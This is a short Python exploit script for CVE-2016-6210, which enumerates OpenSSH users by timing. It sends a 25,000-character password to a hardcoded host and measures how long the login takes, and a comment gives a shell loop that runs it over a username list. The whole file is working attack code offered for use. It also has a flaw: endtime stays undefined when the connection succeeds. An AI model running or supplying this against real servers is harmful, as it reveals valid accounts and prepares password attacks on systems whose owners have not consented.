#!/bin/python

# tiny script to exploit cve 2016 6210 - openssh user enumeration
# on use per line in the "list" file
# while read l; do ./cve_2016_6210.py $l; done < list
# http://matthieukeller.com/2016/07/cve-2016-6210-opensshd-user-enumeration.html

import paramiko
import time
import sys

user = sys.argv[1]
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
         ssh.connect('192.168.4.231', username=user,
         password=p)
except:
         endtime=time.clock()
total=endtime-starttime
print(str(user)+ ": " +str(total))
